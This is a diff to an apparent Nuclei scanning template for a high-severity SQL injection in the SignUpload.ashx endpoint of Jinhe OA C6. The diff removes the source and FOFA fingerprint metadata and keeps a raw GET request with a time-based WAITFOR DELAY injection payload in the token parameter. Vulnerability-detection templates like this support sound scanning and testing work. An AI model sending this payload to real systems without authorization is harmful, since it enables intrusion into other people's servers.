@@ -3,12 +3,8 @@ info:
   name: 金和OA C6 SignUpload.ashx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/huvmtcpsp6hf0a20'
+  description: ''
   tags: sqli,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: huvmtcpsp6hf0a20
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%205%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
